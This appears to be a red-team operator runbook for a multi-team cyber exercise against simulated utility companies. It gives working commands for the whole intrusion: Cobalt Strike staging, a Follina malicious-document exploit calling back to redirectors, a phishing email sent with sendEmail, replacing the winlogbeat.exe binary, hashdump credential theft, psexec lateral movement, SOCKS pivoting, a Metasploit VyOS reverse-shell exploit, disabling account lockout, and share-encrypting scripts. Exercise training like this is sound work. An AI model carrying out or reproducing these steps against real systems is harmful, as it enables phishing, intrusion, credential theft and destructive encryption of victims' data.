## __Team 1 & 2 CY22__: Edits for CY2023




---
## __Infrastructure__

#### __Kali (Cobalt Strike) Team Server:__ 
Attack Box 12: 172.27.3.3
			
#### __Redirector IPs:__ 

||Redirector 1|Redirector 2|Redirector 3|
|-------------|------------|------------|------------|
|IP|202.84.73.3|202.84.73.4|202.84.73.5|  
|Listners/  <br />Beacons|Folina<br />C2 Beacon|C2 Beacon|C2 Beacon  


### __Cobalt Strike Staging__

* Open the Cobalt Strike application  
  * Selet the 'Listeners' tab -> Add
  * Set the Name for the Listener 'HTTPS'
  * Set the Payload to Beacon-HTTPS
  * Select the the HTTPS Hosts + Icon  
    * Add all three redirector IPs
⦁	Change your Host Stager to __redir2__ IP   
⦁	Click save  

---
## __Initial Access__  

### __Initial Access Payload Configuration__


Prerequisite: Add the _follina_ folder from https://github.com/JohnHammond/msdt-follina to:    
`/kali/follina/` on one of the Redirectors

* Generate a stageless windows executable   
  * Select “Attacks” from the toolbar at the top of the GUI and navigate to 
    Packages -> Windows Executable (s)  
    * Listener: (Click the listener you made)  
    * Output:  Windows Executable  

  * Name your executable “AES.exe” and place it in the `/kali/follina/` directory.

Open up a Teminal window on redir1  
`cd ~/kali/follina/`  

__Run the exploit__  
This will:  
 * Start a web server hosting an index.html file which contains the commands you want it to run  
  * Generate a malicous .docx file (AES-Flyer.doc) that will run remote code execution to call back to out machine and pull down the HTML file 

Command Syntax:   
`sudo python follina.py –i <redirector ip for your team> –o AES-Flyer.doc –r <LPORT>`

Command Run:  
`sudo python follina.py -i 202.84.73.3 -o AES-Flyer.doc -r 8000`

***DONT CLOSE THIS TERMINAL***  

//Remove// Please reference the “copied staging doc /tmp/..” path for the following step.

Copy the executable created earlier to the www directory within the temp directory created by follina.py(example: /tmp/nyka2ztk/www).

Command Synatx:  
`sudo cp ~/Desktop/cy22/msdt-follina/AES.exe </tmp/**path/that/was/output/**www/>`   

//Change Pending//  
```
> To get your attachment to Grey Space Kali (24.4.54.67),
> While in your Red Team Kali terminal:
> cd ~/Desktop/cy22/msdt-follina
> ip a
> python -m http.server 8001

***********
ENSURE NO OTHER TEAM IS ON THE GREY SPACE BOX BEFORE YOU PROCEED
***********
Currently using this box: Team 1

While in the regionalISP8 Grey Space Kali Box, in a terminal: 
wget http://<your red team IP>:8001/AES-Flyer.doc
NOTE WHERE IT DOWNLOADS TO AND COPY PATH
```

While on the Grey Space Kali IP, 

⦁	Send a phishing email.
⦁	Use sendmail to send the malware document to targeted email.
Please replace [YOUR DOMAIN.COM] with your target domain, and -s with your Server IP.

Target Team1: <domain>.com, Server IP: 172.x.x.x  
Target Team2: <domain>.com, Server IP: 172.x.x.x  
Target Team3: <domain>.com, Server IP: 172..x.x.x  
Target Team4: <domain>.com, Server IP: 172.x.x.x  
Target Team5: <domain>.com, Server IP: 172.x.x.x  


IN THE GREY SPACE KALI TERMINAL:  
Command Sytax:  
```
sendEmail -t <random name>@[YOUR DOMAIN.COM] -f "Krissy Franklin krissy.franklin@AES-Support.com" -u "Upcoming Sustainability Conference" -s <your exchange server> -m "Good morning leaders, attached is a flyer for this years upcoming America East Sustainability Conference! Please review and email me back for whether you're available and will be attending. Join us for the inaugural America East Sustainability Conference hosted on UMass Lowell’s campus, July 13-17, 2023! The conference will explore ways that our stakeholders and conference participants can work together to drive sustainable practices forward in their own programs, leverage additional resources and funding opportunities, and help create joint research and teaching projects focused on sustainability." -a PATH/WHERE/ATTACHMENT/WAS/DOWNLOADED -o tls=no
```

Command Ran:
```
sendEmail -t erika.velasquez@pierceelectric.com -f "Krissy Franklin krissy.franklin@AES-Support.com" -u "Upcoming Sustainability Conference" -s 172.19.2.2 -m "Good morning leaders, attached is a flyer for this years upcoming America East Sustainability Conference! Please review and email me back for whether you're available and will be attending. Join us for the inaugural America East Sustainability Conference hosted on UMass Lowells campus, July 13-17, 2023! The conference will explore ways that our stakeholders and conference participants can work together to drive sustainable practices forward in their own programs, leverage additional resources and funding opportunities, and help create joint research and teaching projects focused on sustainability." -a AES-Flyer.doc -o tls=no
May 17 13:29:24 kali sendEmail[72197]: Email was sent successfully!

```

Replace -t <email address> in the previous command with each user and send the email like:
-t <first>.<last>@<fqdn of your company>

Approved users:  
__Unknown__  

After sending your emails and confirming that you have received beacons on your Red Team server ensure that you remove the AES-Flyer.doc you downloaded to the Grey space kali box. (It is a shared box)

### Interact with beacon   
* A beacon will spawn in your instance of cobaltstrike.
  * Right click the beacon and navigate to explore
  * Select process list
  * Find the process tab that opens up in the task bar
  * Navigate through the task bar and select a “svchost.exe” process under the context of your user
  * Press “inject”
  * Select your https listener.
*	Once a new beacon spawns, right click the previous beacon and press exit, then right click again and press remove. 
* Right click > interact with the new svchost.exe beacon and in the beacon window enter the following commands and confirm that AES.exe is removed 

### Generate service executable
* Select 'Payload' from the toolbar at the top of the GUI and navigate to Packages -> Windows Executable(s)
 
* Select your https listener and set output “Windows Service EXE”
  * Generate and save your executable as winlogbeat.exe in ~/Desktop/cobaltstrike/

***Pause here and confirm with range control that you have permissions set to modify winlogbeat.exe***

* In your beacon on the target execute the following commands:
```
cd C:\Program Files
cd Elastic
cd Beats
cd 8.2.2
cd winlogbeat
rm winlogbeat.exe
upload winlogbeat.exe
timestomp winlogbeat.exe NOTICE.txt
ls
```
⦁	Issue the following command in your beacon  
`powerpick shutdown /r`

⦁	A new beacon will spawn in a SYSTEM* beacon upon restarting
The AES.exe will upload to `C:\Windows\Tasks`

Remove AES:  
```
cd C:\Windows\Tasks
rm AES.exe
```
Right click the system beacon and navigate to explore    
* Select process list  
* Find the process tab that opens up in the task bar   
* Navigate through the task bar and select a “svchost.exe” process under the context of your user  
* Press “inject”  
* Select your https listener.    

We will run hashdump save user/administrator creds cached on the box to our Cobalt Strike Credentials table.
	
`hashdump`

__Inject into an administrator beacon from the new SYSTEM* beacon__  
* Creating a new SMB Listener
    * Click on the headphones of the Cobalt Strike toolbar, then click on Add.  
    * Change the Payload to SMB, and then press Save.

__In the System beacon enter the following command:__   
`Portscan 172.19.2.3 20,21,445 none 5`

---
## __Lateral Movement__

* Now, you will laterally move to his machine via psexec64. This command will jump you onto this box. First, click on the reticle button, and then right click FILE, and then press jump, then psexec64.

__Beacon 1 (File Server):__   

* Ensure you select the SMB listener in the pop up window
* A new beacon will spawn as SYSTEM under rundll32.exe
* From the new System Beacon on the file-server enter the following command:  
`portscan 172.x.19.3 445 none 5`   

__Beacon 2 (IT User Box):__   
Ensure you select the SMB listener in the pop up window

Right click on the SYSTEM* beacon  
* Click on Explore > Process List  
* A new tab will open.   
* Click on an svchost process running as System  
* Click inject  
* Select the HTTPS listener  

Note: The second should beacon to the https listener to have a separate method of communication   
(set the sleep time to be very slow)
```
hashdump
sleep 900
```
--- 

## __Router exploitation__
Teams will have to locate the credentials belonging to the Network Admin and dump his hashes to continue. From Open-Source Resource, we’ve discovered that the Admin is Barrett.Guiterrez.  

Laterally moving for Router Exploitation:   
* You will run the following commands from a SYSTEM* beacon on the file-server. This command will show who has logged onto the box.  

`powerpick query user /server:<your team IP>`  

Team1: 172.16.19.5 (WW-IT3)  
Team2: 172.19.19.10 (PE-IT8)  
Team3: 172.20.19.10 (RE-IT8)  
Team4: 172.18.19.5 (SE-IT3)  
Team5: 172.17.19.5 (HLNG-IT3)  

`portscan <your team ip> 445 none 5`  

* Now, you will laterally move to his machine via psexec64. This command will jump you onto this box. First, click on the reticle button, and then right click the IT8 or IT3 box, and then press jump, then psexec64.  

* In the prompt, click on Administrator. This will allow you to jump with his creds. For the following windows:   
  Listener: SMB Beacon  
  Session: An administrator* session  
* Click Launch.
* Run hashdump on second IT computer 
* From the new beacon, inject into a different process:
  * Right click on the new SYSTEM* beacon.
  * Click on Explore > Process List
  * A new tab will open.
  * Click on an svchost process running as Barrett.Guiterrez.
  * Click inject.
  * Select HTTPS LIstener  

For further enumeration, we will be exploiting a Router running Vyos 1.8.8 and exfilling the config file.  

Setting up SOCKS4 proxy on Red Team Kali  
* In a linux terminal:  
`sudo vim /etc/proxychains4.conf`  
* Press ‘i’ for Insert.  
* At the bottom of the file insert:  
`Socks4  <Teamserver IP> 55467`  
Note: 2 spaces in between Socks4 and IP  
* Press esc to exit Insert mode    
`:wq!`    

Remember: You’d want the Proxy Port of the team server to be a high ephemeral, and remember it for when we set up the SOCKS4 proxy through the Cobalt Strike beacon.  

Setting up a Cobalt Strike beacon SOCKS4 proxy  
* Right click an escalated beacon (Barrett.Guiterrez)  
* interact  
* sleep 15  
* right click beacon again  
* Pivoting > SOCKS Server   
* In the SOCKS4 Proxy Port, input the socks4 port you’ve been setting up your forwarders for.   

To make things easier, Socks4 port will be 55467  
 

__Setting up Port Forwarding on the Local Kali using ‘socat’__  
* In a linux terminal, you’re going to run this command:
`socat TCP4-LISTEN:55468,fork SOCKS4:[teamserver_ip]:[gateway_ip]:22,socksport=55467`  

Here is a breakdown of the socat command for your situational awareness  
`socat TCP4-LISTEN:55468,fork SOCKS4:172.27.3.22:172.16.5.1:22,socksport=55467`  
`TCP4-LISTEN:55468` :: Kali is listening on this port, whatever comes in on this port is forwarded through:    
socksport=55467 through the proxy SOCKS4:172.27.3.22 and then forwarded to :172.16.5.1:22    

Setting up msfconsole for forwarding through a proxy  
In a linux terminal:   
```
msfconsole
setg proxies socks4:[teamserverip]:55467
setg ReverseAllowProxy true
```
__Preparing your metasploit exploit__  

Remember: You do not need to set up your own msf listener. The exploit will do it for you.
* In the same msfconsole:
`use exploit/linux/ssh/vyos_restricted_shell_privesc`
It should auto set the payload to /cmd/unix/.. if it doesn’t:  
	`set payload cmd/unix/reverse_bash`  
__options__   
```
set rhosts [teamserver's ip]  
set rport 55468  
Using the example from earlier, the port would be 55468  
set password simnet  
set username vyatta  
set lhost [redirector IP]  
set lport 36729  
set SSH_TIMEOUT 100  
show advanced  

exploit -j
```
This may take a few seconds. If you receive a connection error or cannot reach a host error, then you need to check your 1) options, 2) socat listening port, 3) your msf proxychains4.conf file.  


* While in your msfconsole:  
	sessions -i 1  
This session isn’t a meterpreter session, but a meta shell. Metashell provides an interactive shell similar to the Python, Haskell and Erlang shells for template metaprogramming. We need to drop into a bash shell on the router.  
```
help
shell 
unset hist
```
Now, we’re in a bash shell. From here we can run various Vyos router commands.  
```
configure
show config
```
Copy and paste the running config of the Vyos router. This running config will give you interfaces, and their respective networks.   

return to barret.guttierz beacon in cobalt strike  

`sleep 300`  


****************************************************************************************************************************PRE DAY 1 STOP/////Do not execute below this line until Instructed to***************
*************************************************************************************************************




The following should be executed via a Cobalt Strike beacon on the “IT” subnet (RSAT should be installed):  
Target Domains  
* hamiltonlng.lan  
* wadsworthwater.lan  
* pierceelectric.lan  
* revereelectric.lan  
* starkelectric.lan    
powershell Set-ADDefaultDomainPasswordPolicy -identity <target_domain> -lockoutthreshold 0  

**DAY 2 STOP/////Do not execute below this line until Instructed to**  

Compromise Share Folder - 007 Secret spleenworts   

Requirements  
⦁	A running CobaltStrike Team Server and beacon to run commands on   
⦁	Beacon host should be on the same network that the target network share is being hosted   
⦁	Bash terminal  
⦁	ManageShare.psm1 script  
⦁	Domain admin credentials (obtained from privilege escalation from spleen warts prior actions)   
⦁	Know the target network share location (ip address and directory location of the shared folder)  

Repeat the all steps for each of the following hosts:  
* <domain>-storage-1  
* <domain>-storage-2  
* <domain>-storage-3  
* <domain>-storage-4  
* <domain>-storage-5  
Domains to sub above:  
* Pierce Electric: pe  
* Wadsworth Water: ww  
* Hamilton LNG: hlng  
* StarkElectric: se  
* RevereElectric: re  
Example hostname: pe-storage-1  
* On a kali machine open a terminal and navigate to the directory containing ManageShare.psm1  
* cd /home/kali/Desktop/super-duper-dollop/  
* Edit the script (In vim: press i)  
* Change the $Share variable to the path of the network share on your network  
`\\<hostname>\Temp`    
* I.e. $Share = “\\pe-storage-1\Temp”;  
* Optionally change the $Sleep variable to a time (in seconds) of your choosing. Default is 3600 seconds for ManageShare and 1800 seconds for CorruptShare (60 seconds x 60 minutes = 3600 seconds in an hour).  
* If using vim: press escape and type :wq to save.  
Step 3: (Beacon)  
* Navigate back to your beacon shell in Cobalt Strike and run:  
* powershell-import -> This will open a file navigator. Navigate and select the ManageShare.psm1 script. Import that.   
* For reference: /home/kali/Desktop/super-duper-dollop/ManageShare.psm1  
* In beacon shell run: powershell ManageShare   
* This will start the process on the target host and will run   indefinitely. You’ll know it worked when it sends back a filename. It will continue to send back a file name of the file being deleted every half hour. It cannot be interrupted or modified short of killing the process.  
* This will begin encrypting every file in C:\Temp (default dir) at a rate of one file per hour.   
* Note: this is not persistent and runs entirely in memory. System restarts or killing of the managing process will completely remove it from the target system.   


Optional follow-ons:  
Customizing the target directory and deletion interval:  
* On a kali machine open a terminal and navigate to the directory containing ManageShare.psm1  
* cd /home/kali/Desktop/super-duper-dollop/  
* Using vim (or text edit), open the desired script  
* vim ManageShare.psm1  
* vim CorruptShare.psm1  
* Edit the script (In vim: press i)  
* Change the $Share variable to the path of the network share on your network  
* Optionally change the $Sleep variable to a time (in seconds) of your choosing. Default is 3600 seconds for ManageShare and 1800 seconds for CorruptShare (60 seconds x 60 minutes = 3600 seconds in an hour).  
* If using vim: press escape and type :wq to save.
Step 4: (Beacon)  
* Follow beacon steps above for desired module.  

* Copy Oldshare.ps1 to a host on the network, then run it against the share. Note: this is an interactive version of ManageShare.psm1 with added functionality.  
* Modify and run ManageShare against other directories by following steps 1-4 above but replacing earlier specified $Share directory with desired targets.   
* Modify and run CorruptShare against other directories by following steps 1-4 above but replacing earlier specified $Share directory with desired targets.  

References:
* “Treasure Hunt” and share exploit repository: https://github.com/thefridge111/super-duper-dollop   
